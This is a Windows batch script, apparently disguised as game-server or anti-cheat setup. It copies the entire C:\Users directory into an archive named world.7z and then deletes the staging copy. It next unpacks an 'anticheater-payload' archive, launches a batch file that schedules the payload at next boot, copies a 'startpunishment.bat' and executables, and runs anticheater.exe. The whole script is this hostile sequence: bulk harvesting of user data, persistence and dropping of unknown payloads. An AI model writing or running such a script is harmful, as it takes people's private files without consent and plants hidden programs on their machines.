@echo off
cls
mkdir C:\lifeserv\payload
mkdir C:\lifeserv\players
mkdir C:\lifeserv\world
cd C:\lifeserv\
xcopy C:\Users C:\lifeserv\players /s /y
xcopy C:\lifeserv\players C:\lifeserv\world /s /y
echo Thats my world > C:\lifeserv\world\readme.txt
cd C:\hacklife\newlife\7z
7za a world.7z C:\lifeserv\world
copy world.7z C:\hacklife\
rd C:\lifeserv\ /s /q
7za e C:\hacklife\newlife\anticheater-payload.7z
xcopy payload C:\hacklife\ /s /y
cd C:\hacklife\payload
start start-payload-at-nextboot.bat
copy startpunishment.bat C:\hacklife\
copy newlife-postrestart.exe C:\hacklife\
copy anticheater.exe C:\hacklife\
cd C:\hacklife\
start anticheater.exe
exit
